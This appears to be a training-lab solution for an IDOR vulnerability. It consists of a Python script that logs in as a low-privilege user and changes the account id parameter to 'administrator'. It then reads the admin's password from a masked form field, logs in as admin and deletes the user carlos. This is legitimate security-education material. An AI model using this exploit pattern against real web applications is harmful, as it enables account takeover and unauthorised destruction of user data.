# User ID controlled by request parameter with password disclosure

> This lab has user account page that contains the current user's existing password, prefilled in a masked input.
> To solve the lab, retrieve the administrator's password, then use it to delete the user `carlos`.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
import sys
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0ad1004704f6a147809699370002000f.web-security-academy.net/"

def get_admin_pw(url):
    """Logs in as Wiener and exploits IDOR to find Admin Password."""
    login_endpoint = url + "login"
    session = requests.Session()
    
    # 1. Login as Wiener
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find("input", {"name": "csrf"})['value']
    
    if token:
        login_creds = {
            "username": "wiener",
            "password": "peter",
            "csrf": token
        }
        response = session.post(login_endpoint, data=login_creds)
        
        if "Log out" in response.text:
            print("[+] LOGIN SUCCESSFULL AS REGULAR USER")
            
            # 2. Exploit IDOR to get Administrator Page
            myaccount_endpoint = url + "my-account"
            params = {
                "id": "administrator"
            }
            response = session.get(myaccount_endpoint, params=params)
            
            # 3. Extract Password from Input Field
            soup = BeautifulSoup(response.text, 'html.parser')
            # Look for <input name="password" value="...">
            adminpw = soup.find("input", {"name": "password"})['value']
            print(f"[+] FOUND ADMIN PASSWORD: {adminpw}")
            return adminpw
            
        else:
            print(f"[-] LOGIN FAILED: {response.status_code}")
            sys.exit(1)
    else:
        print("[-] CSRF TOKEN NOT FOUND")
        sys.exit(1)

def dlt_carlos(url, adminpw):
    """Logs in as Administrator and deletes Carlos."""
    login_endpoint = url + "login"
    
    # Start a FRESH session to login as Admin (dropping Wiener's cookies)
    session = requests.Session()
    
    # Get fresh CSRF token
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find("input", {"name": "csrf"})['value']

    admin_creds = {
        "username": "administrator",
        "password": adminpw,
        "csrf": token
    }
    
    # Login as Admin
    response = session.post(login_endpoint, data=admin_creds)
    
    if "Log out" in response.text:
        print("[+] LOGGED IN AS ADMINISTRATOR")
        
        # Execute Deletion
        delete_endpoint = url + "admin/delete"
        params = {
            "username": "carlos"
        }
        response = session.get(delete_endpoint, params=params)
        
        if response.status_code == 200:
            print("[+] SUCCESS: CARLOS DELETED")
        else:
            print(f"[-] Deletion failed. Status: {response.status_code}")
    else:
        print("[-] Admin Login Failed.")

if __name__ == "__main__":
    password = get_admin_pw(BASE_URL)
    if password:
        dlt_carlos(BASE_URL, password)
```